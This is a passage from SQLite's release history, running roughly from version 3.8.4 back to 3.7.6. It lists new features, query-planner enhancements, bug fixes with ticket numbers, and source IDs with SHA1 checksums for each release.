Make sure \"rowid\" columns are correctly resolved in joins between normal tables and WITHOUT ROWID tables. Ticket [c34d0557f7] Bug fix: Make sure the same temporary registers are not used in concurrent co-routines used to implement compound SELECT statements containing ORDER BY clauses, as such use can lead to incorrect answers. Ticket [8c63ff0eca] Bug fix: Ensure that \"ORDER BY random()\" clauses do not get optimized out. Ticket [65bdeb9739] Bug fix: Repair a name-resolution error that can occur in sub-select statements contained within a TRIGGER. Ticket [4ef7e3cfca] Bug fix: Fix column default values expressions of the form \"DEFAULT(-(-9223372036854775808))\" so that they work correctly, initializing the column to a floating point value approximately equal to +9223372036854775808.0. SQLITE_SOURCE_ID: \"2014-03-10 12:20:37 530a1ee7dc2435f80960ce4710a3c2d2bfaaccc5\" SHA1 for sqlite3.c: b0c22e5f15f5ba2afd017ecd990ea507918afe1c 2014-02-11 (3.8.3.1) Fix a bug (ticket 4c86b126f2) that causes rows to go missing on some queries with OR clauses and IS NOT NULL operators in the WHERE clause, when the SQLITE_ENABLE_STAT3 or SQLITE_ENABLE_STAT4 compile-time options are used. Fix a harmless compiler warning that was causing problems for VS2013. SQLITE_SOURCE_ID: \"2014-02-11 14:52:19 ea3317a4803d71d88183b29f1d3086f46d68a00e\" SHA1 for sqlite3.c: 990004ef2d0eec6a339e4caa562423897fe02bf0 2014-02-03 (3.8.3) Added support for common table expressions and the WITH clause. Added the printf() SQL function. Added SQLITE_DETERMINISTIC as an optional bit in the 4th argument to the sqlite3_create_function() and related interfaces, providing applications with the ability to create new functions that can be factored out of inner loops when they have constant arguments. Add SQLITE_READONLY_DBMOVED error code, returned at the beginning of a transaction, to indicate that the underlying database file has been renamed or moved out from under SQLite. Allow arbitrary expressions, including function calls and subqueries, in the filename argument to ATTACH. Allow a VALUES clause to be used anywhere a SELECT statement is valid. Reseed the PRNG used by sqlite3_randomness(N,P) when invoked with N==0. Automatically reseed after a fork() on unix. Enhance the spellfix1 virtual table so that it can search efficiently by rowid. Performance enhancements. Improvements to the comments in the VDBE byte-code display when running EXPLAIN. Add the \"%token_class\" directive to Lemon parser generator and use it to simplify the grammar. Change the Lemon source code to avoid calling C-library functions that OpenBSD considers dangerous. (Ex: sprintf). Bug fix: In the command-line shell CSV import feature, do not end a field when an escaped double-quote occurs at the end of a CRLN line. SQLITE_SOURCE_ID: \"2014-02-03 13:52:03 e816dd924619db5f766de6df74ea2194f3e3b538\" SHA1 for sqlite3.c: 98a07da78f71b0275e8d9c510486877adc31dbee 2013-12-06 (3.8.2) Changed the defined behavior for the CAST expression when floating point values greater than +9223372036854775807 are cast into into integers so that the result is the largest possible integer, +9223372036854775807, instead of the smallest possible integer, -9223372036854775808. After this change, CAST(9223372036854775809.0 as INT) yields +9223372036854775807 instead of -9223372036854775808. Potentially Incompatible Change! Added support for WITHOUT ROWID tables. Added the skip-scan optimization to the query planner. Extended the virtual table interface, and in particular the sqlite3_index_info object to allow a virtual table to report its estimate on the number of rows that will be returned by a query. Update the R-Tree extension to make use of the enhanced virtual table interface. Add the SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option. Enhanced the comments that are inserted into EXPLAIN output when the SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is enabled. Performance enhancements in the VDBE, especially to the OP_Column opcode. Factor constant subexpressions in inner loops out to the initialization code in prepared statements. Enhanced the \".explain\" output formatting of the command-line shell so that loops are indented to better show the structure of the program. Enhanced the \".timer\" feature of the command-line shell so that it shows wall-clock time in addition to system and user times. SQLITE_SOURCE_ID: \"2013-12-06 14:53:30 27392118af4c38c5203a04b8013e1afdb1cebd0d\" SHA1 for sqlite3.c: 6422c7d69866f5ea3db0968f67ee596e7114544e 2013-10-17 (3.8.1) Added the unlikely() and likelihood() SQL functions to be used as hints to the query planner. Enhancements to the query planner: Take into account the fact WHERE clause terms that cannot be used with indices still probably reduce the number of output rows. Estimate the sizes of table and index rows and use the smallest applicable B-Tree for full scans and \"count(*)\" operations. Added the soft_heap_limit pragma. Added support for SQLITE_ENABLE_STAT4 Added support for \"sz=NNN\" parameters at the end of sqlite_stat1.stat fields used to specify the average length in bytes for table and index rows. Avoid running foreign-key constraint checks on an UPDATE if none of the modified columns are associated with foreign keys. Added the SQLITE_MINIMUM_FILE_DESCRIPTOR compile-time option Added the win32-longpath VFS on windows, permitting filenames up to 32K characters in length. The Date And Time Functions are enhanced so that the current time (ex: julianday('now')) is always the same for multiple function invocations within the same sqlite3_step() call. Add the \"totype.c\" extension, implementing the tointeger() and toreal() SQL functions. FTS4 queries are better able to make use of docid<$limit constraints to limit the amount of I/O required. Added the hidden fts4aux languageid column to the fts4aux virtual table. The VACUUM command packs the database about 1% tighter. The sqlite3_analyzer utility program is updated to provide better descriptions and to compute a more accurate estimate for \"Non-sequential pages\" Refactor the implementation of PRAGMA statements to improve parsing performance. The directory used to hold temporary files on unix can now be set using the SQLITE_TMPDIR environment variable, which takes precedence over the TMPDIR environment variable. The sqlite3_temp_directory global variable still has higher precedence than both environment variables, however. Added the PRAGMA stats statement. Bug fix: Return the correct answer for \"SELECT count(*) FROM table\" even if there is a partial index on the table. Ticket a5c8ed66ca. SQLITE_SOURCE_ID: \"2013-10-17 12:57:35 c78be6d786c19073b3a6730dfe3fb1be54f5657a\" SHA1 for sqlite3.c: 0a54d76566728c2ba96292a49b138e4f69a7c391 2013-09-03 (3.8.0.2) Fix a bug in the optimization that attempts to omit unused LEFT JOINs SQLITE_SOURCE_ID: \"2013-09-03 17:11:13 7dd4968f235d6e1ca9547cda9cf3bd570e1609ef\" SHA1 for sqlite3.c: 6cf0c7b46975a87a0dc3fba69c229a7de61b0c21 2013-08-29 (3.8.0.1) Fix an off-by-one error that caused quoted empty string at the end of a CRNL-terminated line of CSV input to be misread by the command-line shell. Fix a query planner bug involving a LEFT JOIN with a BETWEEN or LIKE/GLOB constraint and then another INNER JOIN to the right that involves an OR constraint. Fix a query planner bug that could result in a segfault when querying tables with a UNIQUE or PRIMARY KEY constraint with more than four columns. SQLITE_SOURCE_ID: \"2013-08-29 17:35:01 352362bc01660edfbda08179d60f09e2038a2f49\" SHA1 for sqlite3.c: 99906bf63e6cef63d6f3d7f8526ac4a70e76559e 2013-08-26 (3.8.0) Add support for partial indexes Cut-over to the next generation query planner for faster and better query plans. The EXPLAIN QUERY PLAN output no longer shows an estimate of the number of rows generated by each loop in a join. Added the FTS4 notindexed option, allowing non-indexed columns in an FTS4 table. Added the SQLITE_STMTSTATUS_VM_STEP option to sqlite3_stmt_status(). Added the cache_spill pragma. Added the query_only pragma. Added the defer_foreign_keys pragma and the sqlite3_db_status(db, SQLITE_DBSTATUS_DEFERRED_FKS,...) C-language interface. Added the \"percentile()\" function as a loadable extension in the ext/misc subdirectory of the source tree. Added the SQLITE_ALLOW_URI_AUTHORITY compile-time option. Add the sqlite3_cancel_auto_extension(X) interface. A running SELECT statement that lacks a FROM clause (or any other statement that never reads or writes from any database file) will not prevent a read transaction from closing. Add the SQLITE_DEFAULT_AUTOMATIC_INDEX compile-time option. Setting this option to 0 disables automatic indices by default. Issue an SQLITE_WARNING_AUTOINDEX warning on the SQLITE_CONFIG_LOG whenever the query planner uses an automatic index. Added the SQLITE_FTS3_MAX_EXPR_DEPTH compile-time option. Added an optional 5th parameter defining the collating sequence to the next_char() extension SQL function. The SQLITE_BUSY_SNAPSHOT extended error code is returned in WAL mode when a read transaction cannot be upgraded to a write transaction because the read is on an older snapshot. Enhancements to the sqlite3_analyzer utility program to provide size information separately for each individual index of a table, in addition to the aggregate size. Allow read transactions to be freely opened and closed by SQL statements run from within the implementation of application-defined SQL functions if the function is called by a SELECT statement that does not access any database table. Disable the use of posix_fallocate() on all (unix) systems unless the HAVE_POSIX_FALLOCATE compile-time option is used. Update the \".import\" command in the command-line shell to support multi-line fields and correct RFC-4180 quoting and to issue warning and/or error messages if the input text is not strictly RFC-4180 compliant. Bug fix: In the unicode61 tokenizer of FTS4, treat all private code points as identifier symbols. Bug fix: Bare identifiers in ORDER BY clauses bind more tightly to output column names, but identifiers in expressions bind more tightly to input column names. Identifiers in GROUP BY clauses always prefer output column names, however. Bug fixes: Multiple problems in the legacy query optimizer were fixed by the move to NGQP. SQLITE_SOURCE_ID: \"2013-08-26 04:50:08 f64cd21e2e23ed7cff48f7dafa5e76adde9321c2\" SHA1 for sqlite3.c: b7347f4b4c2a840e6ba12040093d606bd16ea21e 2013-05-20 (3.7.17) Add support for memory-mapped I/O. Add the sqlite3_strglob() convenience interface. Assigned the integer at offset 68 in the database header as the Application ID for when SQLite is used as an application file-format. Added the PRAGMA application_id command to query and set the Application ID. Report rollback recovery in the error log as SQLITE_NOTICE_RECOVER_ROLLBACK. Change the error log code for WAL recover from SQLITE_OK to SQLITE_NOTICE_RECOVER_WAL. Report the risky uses of unlinked database files and database filename aliasing as SQLITE_WARNING messages in the error log. Added the SQLITE_TRACE_SIZE_LIMIT compile-time option. Increase the default value of SQLITE_MAX_SCHEMA_RETRY to 50 and make sure that it is honored in every place that a schema change might force a statement retry. Add a new test harness called \"mptester\" used to verify correct operation when multiple processes are using the same database file at the same time. Enhance the extension loading mechanism to be more flexible (while still maintaining backwards compatibility) in two ways: If the default entry point \"sqlite3_extension_init\" is not present in the loadable extension, also try an entry point \"sqlite3_X_init\" where \"X\" is based on the shared library filename. This allows every extension to have a different entry point, which allows them to be statically linked with no code changes. The shared library filename passed to sqlite3_load_extension() may omit the filename suffix, and an appropriate architecture-dependent suffix (\".so\", \".dylib\", or \".dll\") will be added automatically. Added many new loadable extensions to the source tree, including amatch, closure, fuzzer, ieee754, nextchar, regexp, spellfix, and wholenumber. See header comments on each extension source file for further information about what that extension does. Enhance FTS3 to avoid using excess stack space when there are a huge number of terms on the right-hand side of the MATCH operator. A side-effect of this change is that the MATCH operator can only accommodate 12 NEAR operators at a time. Enhance the fts4aux virtual table so that it can be a TEMP table. Added the fts3tokenize virtual table to the full-text search logic. Query planner enhancement: Use the transitive property of constraints to move constraints into the outer loops of a join whenever possible, thereby reducing the amount of work that needs to occur in inner loops. Discontinue the use of posix_fallocate() on unix, as it does not work on all filesystems. Improved tracing and debugging facilities in the Windows VFS. Bug fix: Fix a potential database corruption bug in shared cache mode when one database connection is closed while another is in the middle of a write transaction. Ticket e636a050b7 Bug fix: Only consider AS names from the result set as candidates for resolving identifiers in the WHERE clause if there are no other matches. In the ORDER BY clause, AS names take priority over any column names. Ticket 2500cdb9be05 Bug fix: Do not allow a virtual table to cancel the ORDER BY clause unless all outer loops are guaranteed to return no more than one row result. Ticket ba82a4a41eac1. Bug fix: Do not suppress the ORDER BY clause on a virtual table query if an IN constraint is used. Ticket f69b96e3076e. Bug fix: The command-line shell gives an exit code of 0 when terminated using the \".quit\" command. Bug fix: Make sure PRAGMA statements appear in sqlite3_trace() output. Bug fix: When a compound query that uses an ORDER BY clause with a COLLATE operator, make sure that the sorting occurs according to the specified collation and that the comparisons associate with the compound query use the native collation. Ticket 6709574d2a8d8. Bug fix: Makes sure the authorizer callback gets a valid pointer to the string \"ROWID\" for the column-name parameter when doing an UPDATE that changes the rowid. Ticket 0eb70d77cb05bb2272 Bug fix: Do not move WHERE clause terms inside OR expressions that are contained within an ON clause of a LEFT JOIN. Ticket f2369304e4 Bug fix: Make sure an error is always reported when attempting to preform an operation that requires a collating sequence that is missing. Ticket 0fc59f908b SQLITE_SOURCE_ID: \"2013-05-20 00:56:22 118a3b35693b134d56ebd780123b7fd6f1497668\" SHA1 for sqlite3.c: 246987605d0503c700a08b9ee99a6b5d67454aab 2013-04-12 (3.7.16.2) Fix a bug (present since version 3.7.13) that could result in database corruption on windows if two or more processes try to access the same database file at the same time and immediately after third process crashed in the middle of committing to that same file. See ticket 7ff3120e4f for further information. SQLITE_SOURCE_ID: \"2013-04-12 11:52:43 cbea02d93865ce0e06789db95fd9168ebac970c7\" SHA1 for sqlite3.c: d466b54789dff4fb0238b9232e74896deaefab94 2013-03-29 (3.7.16.1) Fix for a bug in the ORDER BY optimizer that was introduced in version 3.7.15 which would sometimes optimize out the sorting step when in fact the sort was required. Ticket a179fe7465 Fix a long-standing bug in the CAST expression that would recognize UTF16 characters as digits even if their most-significant-byte was not zero. Ticket 689137afb6da41. Fix a bug in the NEAR operator of FTS3 when applied to subfields. Ticket 38b1ae018f. Fix a long-standing bug in the storage engine that would (very rarely) cause a spurious report of an SQLITE_CORRUPT error but which was otherwise harmless. Ticket 6bfb98dfc0c. The SQLITE_OMIT_MERGE_SORT option has been removed. The merge sorter is now a required component of SQLite. Fixed lots of spelling errors in the source-code comments SQLITE_SOURCE_ID: \"2013-03-29 13:44:34 527231bc67285f01fb18d4451b28f61da3c4e39d\" SHA1 for sqlite3.c: 7a91ceceac9bcf47ceb8219126276e5518f7ff5a 2013-03-18 (3.7.16) Added the PRAGMA foreign_key_check command. Added new extended error codes for all SQLITE_CONSTRAINT errors Added the SQLITE_READONLY_ROLLBACK extended error code for when a database cannot be opened because it needs rollback recovery but is read-only. Added SQL functions unicode(A) and char(X1,...,XN). Performance improvements for PRAGMA incremental_vacuum, especially in cases where the number of free pages is greater than what will fit on a single trunk page of the freelist. Improved optimization of queries containing aggregate min() or max(). Enhance virtual tables so that they can potentially use an index when the WHERE clause contains the IN operator. Allow indices to be used for sorting even if prior terms of the index are constrained by IN operators in the WHERE clause. Enhance the PRAGMA table_info command so that the \"pk\" column is an increasing integer to show the order of columns in the primary key. Enhance the query optimizer to exploit transitive join constraints. Performance improvements in the query optimizer. Allow the error message from PRAGMA integrity_check to be longer than 20000 bytes. Improved name resolution for deeply nested queries. Added the test_regexp.c module as a demonstration of how to implement the REGEXP operator. Improved error messages in the RTREE extension. Enhance the command-line shell so that a non-zero argument to the \".exit\" command causes the shell to exit immediately without cleanly shutting down the database connection. Improved error messages for invalid boolean arguments to dot-commands in the command-line shell. Improved error messages for \"foreign key mismatch\" showing the names of the two tables involved. Remove all uses of umask() in the unix VFS. Added the PRAGMA vdbe_addoptrace and PRAGMA vdbe_debug commands. Change to use strncmp() or the equivalent instead of memcmp() when comparing non-zero-terminated strings. Update cygwin interfaces to omit deprecated API calls. Enhance the spellfix1 extension so that the edit distance cost table can be changed at runtime by inserting a string like 'edit_cost_table=TABLE' into the \"command\" field. Bug fix: repair a long-standing problem that could cause incorrect query results in a 3-way or larger join that compared INTEGER fields against TEXT fields in two or more places. Ticket fc7bd6358f Bug fix: Issue an error message if the 16-bit reference counter on a view overflows due to an overly complex query. Bug fix: Avoid leaking memory on LIMIT and OFFSET clauses in deeply nested UNION ALL queries. Bug fix: Make sure the schema is up-to-date prior to running pragmas table_info, index_list, index_info, and foreign_key_list. SQLITE_SOURCE_ID: \"2013-03-18 11:39:23 66d5f2b76750f3520eb7a495f6247206758f5b90\" SHA1 for sqlite3.c: 7308ab891ca1b2ebc596025cfe4dc36f1ee89cf6 2013-01-09 (3.7.15.2) Fix a bug, introduced in version 3.7.15, that causes an ORDER BY clause to be optimized out of a three-way join when the ORDER BY is actually required. Ticket 598f5f7596b055 SQLITE_SOURCE_ID: \"2013-01-09 11:53:05 c0e09560d26f0a6456be9dd3447f5311eb4f238f\" SHA1 for sqlite3.c: 5741f47d1bc38aa0a8c38f09e60a5fe0031f272d 2012-12-19 (3.7.15.1) Fix a bug, introduced in version 3.7.15, that causes a segfault if the AS name of a result column of a SELECT statement is used as a logical term in the WHERE clause. Ticket a7b7803e8d1e869. SQLITE_SOURCE_ID: \"2012-12-19 20:39:10 6b85b767d0ff7975146156a99ad673f2c1a23318\" SHA1 for sqlite3.c: bbbaa68061e925bd4d7d18d7e1270935c5f7e39a 2012-12-12 (3.7.15) Added the sqlite3_errstr() interface. Avoid invoking the sqlite3_trace() callback multiple times when a statement is automatically reprepared due to SQLITE_SCHEMA errors. Added support for Windows Phone 8 platforms Enhance IN operator processing to make use of indices with numeric affinities. Do full-table scans using covering indices when possible, under the theory that an index will be smaller and hence can be scanned with less I/O. Enhance the query optimizer so that ORDER BY clauses are more aggressively optimized, especially in joins where various terms of the ORDER BY clause come from separate tables of the join. Add the ability to implement FROM clause subqueries as coroutines rather that manifesting the subquery into a temporary table. Enhancements the command-line shell: Added the \".print\" command Negative numbers in the \".width\" command cause right-alignment Add the \".wheretrace\" command when compiled with SQLITE_DEBUG Added the busy_timeout pragma. Added the instr() SQL function. Added the SQLITE_FCNTL_BUSYHANDLER file control, used to allow VFS implementations to get access to the busy handler callback. The xDelete method in the built-in VFSes now return SQLITE_IOERR_DELETE_NOENT if the file to be deleted does not exist. Enhanced support for QNX. Work around an optimizer bug in the MSVC compiler when targeting ARM. Bug fix: Avoid various concurrency problems in shared cache mode. Bug fix: Avoid a deadlock or crash if the backup API, shared cache, and the SQLite Encryption Extension are all used at once. Bug fix: SQL functions created using the TCL interface honor the \"nullvalue\" setting. Bug fix: Fix a 32-bit overflow problem on CREATE INDEX for databases larger than 16GB. Bug fix: Avoid segfault when using the COLLATE operator inside of a CHECK constraint or view in shared cache mode. SQLITE_SOURCE_ID: \"2012-12-12 13:36:53 cd0b37c52658bfdf992b1e3dc467bae1835a94ae\" SHA1 for sqlite3.c: 2b413611f5e3e3b6ef5f618f2a9209cdf25cbcff\" 2012-10-04 (3.7.14.1) Fix a bug (ticket [d02e1406a58ea02d]]) that causes a segfault on a LEFT JOIN that includes an OR in the ON clause. Work around a bug in the optimizer in the VisualStudio-2012 compiler that causes invalid code to be generated when compiling SQLite on ARM. Fix the TCL interface so that the \"nullvalue\" setting is honored for TCL implementations of SQL functions. SQLITE_SOURCE_ID: \"2012-10-04 19:37:12 091570e46d04e84b67228e0bdbcd6e1fb60c6bdb\" SHA1 for sqlite3.c: 62aaecaacab3a4bf4a8fe4aec1cfdc1571fe9a44 2012-09-03 (3.7.14) Drop built-in support for OS/2. If you need to upgrade an OS/2 application to use this or a later version of SQLite, then add an application-defined VFS using the sqlite3_vfs_register() interface. The code removed in this release can serve as a baseline for the application-defined VFS. Ensure that floating point values are preserved exactly when reconstructing a database from the output of the \".dump\" command of the command-line shell. Added the sqlite3_close_v2() interface. Updated the command-line shell so that it can be built using SQLITE_OMIT_FLOATING_POINT and SQLITE_OMIT_AUTOINIT. Improvements to the windows makefiles and build processes. Enhancements to PRAGMA integrity_check and PRAGMA quick_check so that they can optionally check just a single attached database instead of all attached databases. Enhancements to WAL mode processing that ensure that at least one valid read-mark is available at all times, so that read-only processes can always read the database. Performance enhancements in the sorter used by ORDER BY and CREATE INDEX. Added the SQLITE_DISABLE_FTS4_DEFERRED compile-time option. Better handling of aggregate queries where the aggregate functions are contained within subqueries. Enhance the query planner so that it will try to use a covering index on queries that make use of or optimization. SQLITE_SOURCE_ID: \"2012-09-03 15:42:36 c0d89d4a9752922f9e367362366efde4f1b06f2a\" SHA1 for sqlite3.c: 5fdf596b29bb426001f28b488ff356ae14d5a5a6 2012-06-11 (3.7.13) In-memory databases that are specified using URI filenames are allowed to use shared cache, so that the same in-memory database can be accessed from multiple database connections. Recognize and use the mode=memory query parameter in URI filenames. Avoid resetting the schema of shared cache connections when any one connection closes. Instead, wait for the last connection to close before resetting the schema. In the RTREE extension, when rounding 64-bit floating point numbers to 32-bit for storage, always round in a direction that causes the bounding box to get larger. Adjust the unix driver to avoid unnecessary calls to fchown(). Add interfaces sqlite3_quota_ferror() and sqlite3_quota_file_available() to the test_quota.c module. The sqlite3_create_module() and sqlite3_create_module_v2() interfaces return SQLITE_MISUSE on any attempt to overload or replace a virtual table module. The destructor is always called in this case, in accordance with historical and current documentation. SQLITE_SOURCE_ID: \"2012-06-11 02:05:22 f5b5a13f7394dc143aa136f1d4faba6839eaa6dc\" SHA1 for sqlite3.c: ff0a771d6252545740ba9685e312b0e3bb6a641b 2012-05-22 (3.7.12.1) Fix a bug (ticket c2ad16f997) in the 3.7.12 release that can cause a segfault for certain obscure nested aggregate queries. Fix various other minor test script problems. SQLITE_SOURCE_ID: \"2012-05-22 02:45:53 6d326d44fd1d626aae0e8456e5fa2049f1ce0789\" SHA1 for sqlite3.c: d494e8d81607f0515d4f386156fb0fd86d5ba7df 2012-05-14 (3.7.12) Add the SQLITE_DBSTATUS_CACHE_WRITE option for sqlite3_db_status(). Optimize the typeof() and length() SQL functions so that they avoid unnecessary reading of database content from disk. Add the FTS4 \"merge\" command, the FTS4 \"automerge\" command, and the FTS4 \"integrity-check\" command. Report the name of specific CHECK constraints that fail. In the command-line shell, use popen() instead of fopen() if the first character of the argument to the \".output\" command is \"|\". Make use of OVERLAPPED in the windows VFS to avoid some system calls and thereby obtain a performance improvement. More aggressive optimization of the AND operator when one side or the other is always false. Improved performance of queries with many OR-connected terms in the WHERE clause that can all be indexed. Add the SQLITE_RTREE_INT_ONLY compile-time option to force the R*Tree Extension Module to use integer instead of floating point values for both storage and computation. Enhance the PRAGMA integrity_check command to use much less memory when processing multi-gigabyte databases. New interfaces added to the test_quota.c add-on module. Added the \".trace\" dot-command to the command-line shell. Allow virtual table constructors to be invoked recursively. Improved optimization of ORDER BY clauses on compound queries. Improved optimization of aggregate subqueries contained within an aggregate query. Bug fix: Fix the RELEASE command so that it does not cancel pending queries. This repairs a problem introduced in 3.7.11. Bug fix: Do not discard the DISTINCT as superfluous unless a subset of the result set is subject to a UNIQUE constraint and it none of the columns in that subset can be NULL. Ticket 385a5b56b9. Bug fix: Do not optimize away an ORDER BY clause that has the same terms as a UNIQUE index unless those terms are also NOT NULL. Ticket 2a5629202f. SQLITE_SOURCE_ID: \"2012-05-14 01:41:23 8654aa9540fe9fd210899d83d17f3f407096c004\" SHA1 for sqlite3.c: 57e2104a0f7b3f528e7f6b7a8e553e2357ccd2e1 2012-03-20 (3.7.11) Enhance the INSERT syntax to allow multiple rows to be inserted via the VALUES clause. Enhance the CREATE VIRTUAL TABLE command to support the IF NOT EXISTS clause. Added the sqlite3_stricmp() interface as a counterpart to sqlite3_strnicmp(). Added the sqlite3_db_readonly() interface. Added the SQLITE_FCNTL_PRAGMA file control, giving VFS implementations the ability to add new PRAGMA statements or to override built-in PRAGMAs. Queries of the form: \"SELECT max(x), y FROM table\" returns the value of y on the same row that contains the maximum x value. Added support for the FTS4 languageid option. Documented support for the FTS4 content option. This feature has actually been in the code since version 3.7.9 but is only now considered to be officially supported. Pending statements no longer block ROLLBACK. Instead, the pending statement will return SQLITE_ABORT upon next access after the ROLLBACK. Improvements to the handling of CSV inputs in the command-line shell Fix a bug introduced in version 3.7.10 that might cause a LEFT JOIN to be incorrectly converted into an INNER JOIN if the WHERE clause indexable terms connected by OR. SQLITE_SOURCE_ID: \"2012-03-20 11:35:50 00bb9c9ce4f465e6ac321ced2a9d0062dc364669\" SHA1 for sqlite3.c: d460d7eda3a9dccd291aed2a9fda868b9b120a10 2012-01-16 (3.7.10) The default schema format number is changed from 1 to 4. This means that, unless the PRAGMA legacy_file_format=ON statement is run, newly created database files will be unreadable by version of SQLite prior to 3.3.0 (2006-01-10). It also means that the descending indices are enabled by default. The sqlite3_pcache_methods structure and the SQLITE_CONFIG_PCACHE and SQLITE_CONFIG_GETPCACHE configuration parameters are deprecated. They are replaced by a new sqlite3_pcache_methods2 structure and SQLITE_CONFIG_PCACHE2 and SQLITE_CONFIG_GETPCACHE2 configuration parameters. Added the powersafe overwrite property to the VFS interface. Provide the SQLITE_IOCAP_POWERSAFE_OVERWRITE I/O capability, the SQLITE_POWERSAFE_OVERWRITE compile-time option, and the \"psow=BOOLEAN\" query parameter for URI filenames. Added the sqlite3_db_release_memory() interface and the shrink_memory pragma. Added the sqlite3_db_filename() interface. Added the sqlite3_stmt_busy() interface. Added the sqlite3_uri_boolean() and sqlite3_uri_int64() interfaces. If the argument to PRAGMA cache_size is negative N, that means to use approximately -1024*N bytes of memory for the page cache regardless of the page size. Enhanced the default memory allocator to make use of _msize() on windows, malloc_size() on Mac, and malloc_usable_size() on Linux. Enhanced the query planner to support index queries with range constraints on the rowid. Enhanced the query planner flattening logic to allow UNION ALL compounds to be promoted upwards to replace a simple wrapper SELECT even if the compounds are joins. Enhanced the query planner so that the xfer optimization can be used with INTEGER PRIMARY KEY ON CONFLICT as long as the destination table is initially empty. Enhanced the windows VFS so that all system calls can be overridden using the xSetSystemCall interface. Updated the \"unix-dotfile\" VFS to use locking directories with mkdir() and rmdir() instead of locking files with open() and unlink(). Enhancements to the test_quota.c extension to support stdio-like interfaces with quotas. Change the unix VFS to be tolerant of read() system calls that return less then the full number of requested bytes. Change both unix and windows VFSes to report a sector size of 4096 instead of the old default of 512. In the TCL Interface, add the -uri option to the \"sqlite3\" TCL command used for creating new database connection objects. Added the SQLITE_TESTCTRL_EXPLAIN_STMT test-control option with the SQLITE_ENABLE_TREE_EXPLAIN compile-time option to enable the command-line shell to display ASCII-art parse trees of SQL statements that it processes, for debugging and analysis. Bug fix: Add an additional xSync when restarting a WAL in order to prevent an exceedingly unlikely but theoretically possible database corruption following power-loss. Ticket ff5be73dee. Bug fix: Change the VDBE so that all registers are initialized to Invalid instead of NULL. Ticket 7bbfb7d442 Bug fix: Fix problems that can result from 32-bit integer overflow. Ticket ac00f496b7e2 SQLITE_SOURCE_ID: \"2012-01-16 13:28:40 ebd01a8deffb5024a5d7494eef800d2366d97204\" SHA1 for sqlite3.c: 6497cbbaad47220bd41e2e4216c54706e7ae95d4 2011-11-01 (3.7.9) If a search token (on the right-hand side of the MATCH operator) in FTS4 begins with \"^\" then that token must be the first in its field of the document. ** Potentially Incompatible Change ** Added options SQLITE_DBSTATUS_CACHE_HIT and SQLITE_DBSTATUS_CACHE_MISS to the sqlite3_db_status() interface. Removed support for SQLITE_ENABLE_STAT2, replacing it with the much more capable SQLITE_ENABLE_STAT3 option. Enhancements to the sqlite3_analyzer utility program, including the --pageinfo and --stats options and support for multiplexed databases. Enhance the sqlite3_data_count() interface so that it can be used to determine if SQLITE_DONE has been seen on the prepared statement. Added the SQLITE_FCNTL_OVERWRITE file-control by which the SQLite core indicates to the VFS that the current transaction will overwrite the entire database file. Increase the default lookaside memory allocator allocation size from 100 to 128 bytes. Enhanced the query planner so that it can factor terms in and out of OR expressions in the WHERE clause in an effort to find better indices. Added the SQLITE_DIRECT_OVERFLOW_READ compile-time option, causing overflow pages to be read directly from the database file, bypassing the page cache. Remove limits on the magnitude of precision and width value in the format specifiers of the sqlite3_mprintf() family of string rendering routines. Fix a bug that prevent ALTER TABLE ... RENAME from working on some virtual tables in a database with a UTF16 encoding. Fix a bug in ASCII-to-float conversion that causes slow performance and incorrect results when converting numbers with ridiculously large exponents. Fix a bug that causes incorrect results in aggregate queries that use multiple aggregate functions whose arguments contain complicated expressions that differ only in the case of string literals contained within those expressions. Fix a bug that prevented the page_count and quick_check pragmas from working correctly if their names were capitalized. Fix a bug that caused VACUUM to fail if the count_changes pragma was engaged. Fix a bug in virtual table implementation that causes a crash if an FTS4 table is dropped inside a transaction and a SAVEPOINT occurs afterwards. SQLITE_SOURCE_ID: \"2011-11-01 00:52:41 c7c6050ef060877ebe77b41d959e9df13f8c9b5e\" SHA1 for sqlite3.c: becd16877f4f9b281b91c97e106089497d71bb47 2011-09-19 (3.7.8) Orders of magnitude performance improvement for CREATE INDEX on very large tables. Improved the windows VFS to better defend against interference from anti-virus software. Improved query plan optimization when the DISTINCT keyword is present. Allow more system calls to be overridden in the unix VFS - to provide better support for chromium sandboxes. Increase the default size of a lookahead cache line from 100 to 128 bytes. Enhancements to the test_quota.c module so that it can track preexisting files. Bug fix: Virtual tables now handle IS NOT NULL constraints correctly. Bug fixes: Correctly handle nested correlated subqueries used with indices in a WHERE clause. SQLITE_SOURCE_ID: \"2011-09-19 14:49:19 3e0da808d2f5b4d12046e05980ca04578f581177\" SHA1 for sqlite3.c: bfcd74a655636b592c5dba6d0d5729c0f8e3b4de 2011-06-28 (3.7.7.1) Fix a bug causing PRAGMA case_sensitive_like statements compiled using sqlite3_prepare() to fail with an SQLITE_SCHEMA error. SQLITE_SOURCE_ID: \"2011-06-28 17:39:05 af0d91adf497f5f36ec3813f04235a6e195a605f\" SHA1 for sqlite3.c: d47594b8a02f6cf58e91fb673e96cb1b397aace0 2011-06-23 (3.7.7) Add support for URI filenames Add the sqlite3_vtab_config() interface in support of ON CONFLICT clauses with virtual tables. Add the xSavepoint, xRelease and xRollbackTo methods in virtual tables in support of SAVEPOINT for virtual tables. Update the built-in FTS3/FTS4 and RTREE virtual tables to support ON CONFLICT clauses and REPLACE. Avoid unnecessary reparsing of the database schema. Added support for the FTS4 prefix option and the FTS4 order option. Allow WAL-mode databases to be opened read-only as long as there is an existing read/write connection. Added support for short filenames. SQLITE_SOURCE_ID: \"2011-06-23 19:49:22 4374b7e83ea0a3fbc3691f9c0c936272862f32f2\" SHA1 for sqlite3.c: 5bbe79e206ae5ffeeca760dbd0d66862228db551 2011-05-19 (3.7.6.3) Fix a problem with WAL mode which could cause transactions to silently rollback if the cache_size is set very small (less than 10) and SQLite comes under memory pressure. 2011-04-17 (3.7.6.2) Fix the function prototype for the open(2) system call to agree with POSIX. Without this fix, pthreads does not work correctly on NetBSD. SQLITE_SOURCE_ID: \"2011-04-17 17:25:17 154ddbc17120be2915eb03edc52af1225eb7cb5e\" SHA1 for sqlite3.c: 806577fd524dd5f3bfd8d4d27392ed2752bc9701 2011-04-13 (3.7.6.1) Fix a bug in 3.7.6 that only appears if the SQLITE_FCNTL_SIZE_HINT file control is used with a build of SQLite that makes use of the HAVE_POSIX_FALLOCATE compile-time option and which has SQLITE_ENABLE_LOCKING_MODE turned off. SQLITE_SOURCE_ID: \"2011-04-13 14:40:25 a35e83eac7b185f4d363d7fa51677f2fdfa27695\" SHA1 for sqlite3.c: b81bfa27d3e09caf3251475863b1ce6dd9f6ab66 2011-04-12 (3.7.6) Added the sqlite3_wal_checkpoint_v2() interface and enhanced the wal_checkpoint pragma to support blocking 